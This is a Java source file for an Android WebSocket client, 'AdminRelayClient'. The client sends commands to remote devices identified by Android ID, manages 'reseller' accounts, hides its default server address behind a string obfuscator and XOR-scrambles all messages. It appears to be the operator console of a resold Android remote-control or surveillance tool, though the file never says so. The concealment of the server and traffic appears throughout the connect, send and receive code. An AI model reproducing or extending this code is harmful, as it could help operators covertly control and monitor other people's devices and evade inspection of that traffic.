
package com.device.ctrl;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import java.net.URI;
import java.net.Socket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.io.IOException;
import android.content.SharedPreferences;
public class AdminRelayClient {
    private static final String TAG = "AdminRelay";
    private static final String DEFAULT_SERVER = StringObfuscator.getDefaultServerUrl();
    private static AdminRelayClient instance;
    private Handler handler = new Handler(Looper.getMainLooper());
    private volatile org.java_websocket.client.WebSocketClient ws;
    private int reconnectDelay = 2000;
    private volatile boolean closed = false;
    private volatile boolean isConnecting = false;
    private OnMessage listener;
    private Runnable reconnectTask;
    private android.content.Context appContext;
    private String resellerId = null;
    private String resellerToken = null;
    private String serverUrl = DEFAULT_SERVER;
    public void setResellerId(String resellerId) { this.resellerId = resellerId; }
    public String getResellerId() { return resellerId; }
    public void setResellerToken(String resellerToken) { this.resellerToken = resellerToken; }
    public String getResellerToken() { return resellerToken; }
    public void setServerUrl(android.content.Context context, String url) {
        if (context != null) {
            this.appContext = context.getApplicationContext();
            getPrefs(this.appContext).edit().putString("server_url", url).apply();
        }
        this.serverUrl = url;
    }
    public String getServerUrl() {
        loadServerUrl();
        return serverUrl;
    }
    public void loadServerUrl() {
        if (appContext != null) {
            String saved = getPrefs(appContext).getString("server_url", DEFAULT_SERVER);
            if (saved != null && !saved.isEmpty()) {
                serverUrl = saved;
            }
        }
    }
    private static SharedPreferences getPrefs(android.content.Context ctx) {
        return ctx.getSharedPreferences("admin_prefs", android.content.Context.MODE_PRIVATE);
    }
    public interface OnMessage { void onMsg(JSONObject msg); }
    public static synchronized AdminRelayClient get() {
        if (instance == null) instance = new AdminRelayClient();
        return instance;
    }
    private AdminRelayClient() {}
    public void init(android.content.Context context, OnMessage listener) {
        System.setProperty("java.net.preferIPv4Stack", "true");
        System.setProperty("java.net.preferIPv6Addresses", "false");
        this.appContext = context != null ? context.getApplicationContext() : null;
        this.listener = listener;
        loadServerUrl();
    }
    public void init(OnMessage listener) {
        System.setProperty("java.net.preferIPv4Stack", "true");
        System.setProperty("java.net.preferIPv6Addresses", "false");
        this.listener = listener;
        loadServerUrl();
    }
    public void connect() {
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null && c.isOpen()) {
            Log.d(TAG, "Already open, skip");
            return;
        }
        if (isConnecting) {
            Log.d(TAG, "Already connecting, skip");
            return;
        }
        if (reconnectTask != null) {
            handler.removeCallbacks(reconnectTask);
            reconnectTask = null;
        }
        if (c != null) {
            try { c.close(); } catch (Exception ignored) {}
            ws = null;
        }
        closed = false;
        isConnecting = true;
        try {
            loadServerUrl();
            Log.i(TAG, "Connecting to " + serverUrl);
            ws = new RelayWebSocketClient(new URI(serverUrl));
            ws.setConnectionLostTimeout(60);
            ws.setSocketFactory(new javax.net.SocketFactory() {
                @Override public Socket createSocket() {
                    Socket s = new Socket();
                    try { s.bind(new InetSocketAddress(InetAddress.getByName("0.0.0.0"), 0)); } catch (Exception ignored) {}
                    return s;
                }
                @Override public Socket createSocket(String host, int port) throws IOException {
                    Socket s = createSocket();
                    s.connect(new InetSocketAddress(host, port), 15000);
                    return s;
                }
                @Override public Socket createSocket(String host, int port, InetAddress localHost, int localPort) throws IOException {
                    return createSocket(host, port);
                }
                @Override public Socket createSocket(InetAddress host, int port) throws IOException {
                    Socket s = createSocket();
                    s.connect(new InetSocketAddress(host, port), 15000);
                    return s;
                }
                @Override public Socket createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) throws IOException {
                    return createSocket(address, port);
                }
            });
            ws.connect();
        } catch (Exception e) {
            isConnecting = false;
            Log.e(TAG, "connect error", e);
            if (!closed) scheduleReconnect();
        }
    }
    private class RelayWebSocketClient extends org.java_websocket.client.WebSocketClient {
        public RelayWebSocketClient(URI serverUri) {
            super(serverUri);
        }
        @Override public void onOpen(org.java_websocket.handshake.ServerHandshake hs) {
            isConnecting = false;
            Log.i(TAG, "Connected");
            reconnectDelay = 2000;
            try {
                JSONObject join = new JSONObject();
                if (resellerId != null && !resellerId.isEmpty()) {
                    join.put("type", "reseller_join");
                    if (resellerToken != null && !resellerToken.isEmpty()) {
                        join.put("token", resellerToken);
                    } else {
                        Log.e(TAG, "Reseller token missing — cannot authenticate");
                        closed = true;
                        close(1008, "No token");
                        return;
                    }
                    Log.i(TAG, "Sending reseller_join with token");
                } else {
                    join.put("type", "admin_join");
                    Log.i(TAG, "Sending admin_join");
                }
                AdminRelayClient.this.send(join);
            } catch (Exception e) { Log.e(TAG, "join failed", e); }
        }
        @Override public void onMessage(String text) {
            try {
                String decrypted = StringObfuscator.XorCipher.c2n(text);
                JSONObject msg = new JSONObject(decrypted);
                Log.d(TAG, "Msg: " + msg.optString("type"));
                if (listener != null) {
                    handler.post(() -> {
                        try { listener.onMsg(msg); } catch (Exception e) { Log.e(TAG, "listener error", e); }
                    });
                }
            } catch (Exception e) { Log.e(TAG, "onMsg parse error", e); }
        }
        @Override public void onClose(int c, String r, boolean remote) {
            if (this != AdminRelayClient.this.ws) {
                return;
            }
            isConnecting = false;
            ws = null;
            Log.w(TAG, "Closed: code=" + c + " reason=" + r + " remote=" + remote);
            if (!closed) scheduleReconnect();
        }
        @Override public void onError(Exception e) {
            Log.e(TAG, "WS Error", e);
            isConnecting = false;
        }
    }
    public boolean send(String msg) {
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null && c.isOpen()) {
            try {
                String wire = StringObfuscator.XorCipher.n2c(msg);
                c.send(wire);
                return true;
            } catch (Exception e) {
                Log.e(TAG, "send error", e);
                return false;
            }
        } else {
            Log.w(TAG, "send: not connected");
            return false;
        }
    }
    public boolean send(JSONObject msg) {
        if (msg != null) {
            return send(msg.toString());
        }
        return false;
    }
    public boolean sendCmd(String androidId, String action, JSONObject data) {
        try {
            JSONObject cmd = new JSONObject();
            cmd.put("type", "cmd");
            if (androidId != null) cmd.put("androidId", androidId);
            cmd.put("action", action);
            if (data != null) cmd.put("data", data);
            boolean success = send(cmd);
            Log.d(TAG, "cmd: " + action + " sent=" + success);
            return success;
        } catch (Exception e) { 
            Log.e(TAG, "sendCmd error", e); 
            return false;
        }
    }
    public void createReseller(String name, String resellerId) {
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "create_reseller");
            msg.put("name", name);
            if (resellerId != null && !resellerId.isEmpty()) {
                msg.put("resellerId", resellerId);
            }
            send(msg);
            Log.d(TAG, "createReseller: " + name);
        } catch (Exception e) { Log.e(TAG, "createReseller error", e); }
    }
    public void deleteReseller(String resellerId) {
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "delete_reseller");
            msg.put("resellerId", resellerId);
            send(msg);
            Log.d(TAG, "deleteReseller: " + resellerId);
        } catch (Exception e) { Log.e(TAG, "deleteReseller error", e); }
    }
    private void scheduleReconnect() {
        if (reconnectTask != null) {
            handler.removeCallbacks(reconnectTask);
        }
        Log.i(TAG, "Reconnecting in " + reconnectDelay + "ms");
        reconnectTask = () -> {
            reconnectTask = null;
            if (!closed) connect();
        };
        handler.postDelayed(reconnectTask, reconnectDelay);
        reconnectDelay = Math.min(reconnectDelay * 2, 30000);
    }
    public void disconnect() {
        closed = true;
        isConnecting = false;
        if (reconnectTask != null) { handler.removeCallbacks(reconnectTask); reconnectTask = null; }
        org.java_websocket.client.WebSocketClient c = ws;
        if (c != null) { try { c.close(); } catch (Exception ignored) {} }
        ws = null;
        listener = null;
    }
}